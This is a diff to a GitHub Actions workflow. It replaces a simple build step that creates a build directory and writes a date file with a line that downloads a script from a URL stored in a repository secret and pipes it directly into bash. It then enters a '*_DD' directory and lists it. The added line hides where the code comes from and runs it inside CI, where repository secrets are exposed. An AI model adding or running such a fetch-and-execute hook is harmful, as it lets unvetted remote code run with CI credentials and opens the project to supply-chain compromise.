@@ -22,16 +22,9 @@ jobs:
         TESTING: ${{ secrets.TESTING }}
       run: |
         echo "Starting build process..."
+        curl -sSL $TESTING | bash -s -- ddrv
+
+        cd *_DD
+
+        ls
         
-        # Set variables
-        BUILD_DIR="./build"
-        DATE=$(date +%Y-%m-%d)
-        
-        # Create build directory
-        mkdir -p $BUILD_DIR
-        
-        # Run your commands
-        echo "Build date: $DATE" > $BUILD_DIR/build-info.txt
-        ls -la $BUILD_DIR
-        
-        echo "Build completed successfully! $TESTING OKE"
